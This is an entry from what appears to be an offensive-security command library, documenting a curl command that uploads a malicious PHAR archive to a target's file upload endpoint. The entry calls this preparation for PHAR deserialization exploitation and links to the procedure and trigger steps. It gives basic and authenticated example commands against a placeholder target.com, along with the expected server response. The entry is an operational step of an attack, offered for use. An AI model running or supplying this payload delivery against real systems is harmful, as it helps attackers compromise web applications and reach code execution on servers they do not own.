---
id: 9bf11b57-bb79-4e53-8a26-4b3b380e443f
name: curl-upload-phar-to-target
type: command
executor: bash
data: curl -F "file=@$_LOCAL_PHAR_PATH" "$_TARGET_UPLOAD_URL"
output: null
created_at: '2023-04-06T03:55:59.449442+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - upload
  - phar
verified: true
validated: true
---

# curl-upload-phar-to-target

## Command

```bash
curl -F "file=@$_LOCAL_PHAR_PATH" "$_TARGET_UPLOAD_URL"
```

## Description

Uploads a local PHAR archive file to the target's file upload endpoint using HTTP multipart form data, positioning it for later deserialization exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LOCAL_PHAR_PATH | Path to the local malicious PHAR file on the attacker's machine | Yes |
| $_TARGET_UPLOAD_URL | URL of the target's upload endpoint (e.g., http://target.com/upload.php) | Yes |
| -F | Specifies multipart form data for file upload | Built-in |

## Examples

### Basic Usage

```bash
curl -F "file=@exploit.phar" "http://target.com/upload.php"
```

### Advanced Usage (with authentication)

```bash
curl -F "file=@exploit.phar" -H "Cookie: session=abc123" "http://target.com/upload.php"
```

## Expected Output

HTTP/1.1 200 OK
Content-Type: text/html

Upload successful or similar confirmation message.

## Related

- [[procedures/Phar-Deserialization-Attack]]
- [[commands/curl-trigger-phar-deserialization]]
